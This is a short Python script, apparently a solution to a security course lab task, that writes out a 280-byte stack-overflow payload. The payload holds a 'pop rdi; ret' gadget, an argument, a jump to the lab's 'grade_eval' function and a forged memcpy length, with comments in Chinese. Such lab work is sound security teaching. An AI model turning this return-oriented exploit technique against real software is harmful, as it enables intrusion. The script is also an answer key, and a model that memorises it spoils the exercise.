#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload  = b"B" * 8                              # saved rbp
payload += b"\xa3\x18\x40\x00\x00\x00\x00\x00"   # 0x4018a3  pop rdi; ret
payload += b"\x04\x00\x00\x00\x00\x00\x00\x00"   # 4
payload += b"\x77\x16\x40\x00\x00\x00\x00\x00"   # 0x401677  grade_eval
payload += b"A" * (128 - 32)                     # 补满 expression 的 128 字节
payload += b"A" * 128                            # logMsg 区域
payload += b"\xa0\x00\x00\x00"                   # len = 160 → memcpy 目的 = rbp
payload += b"A" * 20                             # pad + 对齐填充
assert len(payload) == 280, len(payload)         # 关键断言，写错立刻报错
payload += b"\x0a"

sys.stdout.buffer.write(payload)
